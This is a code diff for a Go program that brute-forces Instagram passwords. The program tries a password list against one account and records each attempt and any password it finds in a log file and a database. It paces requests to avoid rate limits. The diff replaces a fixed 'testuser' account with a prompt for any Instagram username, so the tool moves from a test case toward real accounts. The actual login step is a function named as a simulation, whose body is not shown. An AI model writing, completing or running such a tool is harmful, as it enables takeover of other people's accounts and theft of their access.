@@ -14,6 +14,7 @@ import (
 
 // Attempt struct to store brute force attempt details
 type Attempt struct {
+    Username  string
     Password  string
     Timestamp string
     Success   bool
@@ -60,6 +61,7 @@ func initDatabase() (*sql.DB, error) {
     _, err = db.Exec(`
         CREATE TABLE IF NOT EXISTS attempts (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
             password TEXT,
             timestamp TEXT,
             success BOOLEAN
@@ -72,10 +74,10 @@ func initDatabase() (*sql.DB, error) {
 }
 
 // logAttempt logs an attempt to the database
-func logAttempt(db *sql.DB, password, timestamp string, success bool) error {
+func logAttempt(db *sql.DB, username, password, timestamp string, success bool) error {
     _, err := db.Exec(
-        "INSERT INTO attempts (password, timestamp, success) VALUES (?, ?, ?)",
-        password, timestamp, success)
+        "INSERT INTO attempts (username, password, timestamp, success) VALUES (?, ?, ?, ?)",
+        username, password, timestamp, success)
     if err != nil {
         return fmt.Errorf("error logging attempt: %v", err)
     }
@@ -86,8 +88,8 @@ func logAttempt(db *sql.DB, password, timestamp string, success bool) error {
 func bruteForceAttack(username string, passwords []string, db *sql.DB, logger *log.Logger) (string, bool) {
     for i, password := range passwords {
         timestamp := time.Now().Format(time.RFC3339)
-        fmt.Printf("Attempt %d: Trying password: %s\n", i+1, password)
-        logger.Printf("Attempt %d: Password: %s, Timestamp: %s", i+1, password, timestamp)
+        fmt.Printf("Attempt %d: Trying password: %s for username: %s\n", i+1, password, username)
+        logger.Printf("Attempt %d: Username: %s, Password: %s, Timestamp: %s", i+1, username, password, timestamp)
 
         // Simulate rate-limiting delay (Instagram typically limits requests)
         time.Sleep(500 * time.Millisecond)
@@ -96,12 +98,12 @@ func bruteForceAttack(username string, passwords []string, db *sql.DB, logger *l
         success := simulateInstagramLogin(username, password)
 
         // Log to database
-        if err := logAttempt(db, password, timestamp, success); err != nil {
+        if err := logAttempt(db, username, password, timestamp, success); err != nil {
             log.Printf("Error logging attempt: %v", err)
         }
 
         if success {
-            logger.Printf("Success: Password found: %s", password)
+            logger.Printf("Success: Password found: %s for username: %s", password, username)
             return password, true
         }
     }
@@ -110,8 +112,15 @@ func bruteForceAttack(username string, passwords []string, db *sql.DB, logger *l
 }
 
 func main() {
-    // Fixed username for simulation
-    username := "testuser"
+    // Prompt for username
+    fmt.Print("Enter Instagram username: ")
+    scanner := bufio.NewScanner(os.Stdin)
+    scanner.Scan()
+    username := strings.TrimSpace(scanner.Text())
+    if username == "" {
+        fmt.Println("Error: Username cannot be empty")
+        return
+    }
 
     // Initialize log file
     logFile, err := os.OpenFile("instagram_brute_force.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -141,7 +150,7 @@ func main() {
     foundPassword, success := bruteForceAttack(username, passwords, db, logger)
 
     if success {
-        fmt.Printf("Success: Password found: %s\n", foundPassword)
+        fmt.Printf("Success: Password found: %s for username: %s\n", foundPassword, username)
     } else {
         fmt.Println("Failed: Password not found in the provided list")
     }
